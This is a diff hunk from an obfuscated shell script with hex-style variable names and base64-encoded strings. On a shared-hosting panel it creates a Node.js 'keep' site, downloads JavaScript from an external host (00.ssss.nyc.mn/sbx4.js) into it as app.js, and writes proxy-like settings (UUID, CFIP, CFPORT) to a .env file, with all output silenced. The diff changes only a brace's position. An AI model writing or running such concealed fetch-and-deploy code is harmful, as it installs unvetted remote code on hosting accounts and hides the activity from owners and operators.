@@ -87,7 +87,7 @@ Deny from all
 </FilesMatch>
 RewriteRule ^${_0xF1}$ ${_0xF1}.php [L]
 EOF
-;}_0xH9(){ _0xT9 "$(echo "aW5zdGFsbGluZyBrZWVwYWxpdmU="|base64 -d)...";devil www del keep.${_0xW2}.${_0xJ5} >/dev/null 2>&1;devil www add keep.${_0xW2}.${_0xJ5} nodejs /usr/local/bin/node18 >/dev/null 2>&1;_0xR5="$HOME/domains/keep.${_0xW2}.${_0xJ5}/public_nodejs";[[ -d "$_0xR5" ]]||mkdir -p "$_0xR5";_0xS6="https://00.ssss.nyc.mn/sbx4.js";$_0xM8 "$_0xR5/app.js" "$_0xS6";cat > $_0xR5/.env <<EOF
+};_0xH9(){ _0xT9 "$(echo "aW5zdGFsbGluZyBrZWVwYWxpdmU="|base64 -d)...";devil www del keep.${_0xW2}.${_0xJ5} >/dev/null 2>&1;devil www add keep.${_0xW2}.${_0xJ5} nodejs /usr/local/bin/node18 >/dev/null 2>&1;_0xR5="$HOME/domains/keep.${_0xW2}.${_0xJ5}/public_nodejs";[[ -d "$_0xR5" ]]||mkdir -p "$_0xR5";_0xS6="https://00.ssss.nyc.mn/sbx4.js";$_0xM8 "$_0xR5/app.js" "$_0xS6";cat > $_0xR5/.env <<EOF
 UUID=$_0xX3
 CFIP=$_0xD9
 CFPORT=$_0xE0
